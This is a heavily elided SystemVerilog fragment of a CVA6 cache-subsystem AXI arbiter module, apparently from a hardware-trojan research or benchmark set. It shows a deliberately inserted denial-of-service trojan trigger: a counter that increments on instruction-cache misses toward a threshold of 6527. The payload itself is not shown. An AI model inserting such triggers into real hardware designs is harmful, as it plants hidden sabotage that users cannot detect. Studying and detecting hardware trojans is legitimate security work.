...
module cva6_hpdcache_subsystem_axi_arbiter_trojan_DoS
//  Parameters
//  {{{
#(
...
(
  ...
  hpdcache_fifo_reg #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6527)
    // ============================================================
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (icache_miss_valid_i) trojan_counter <= trojan_counter + 1;
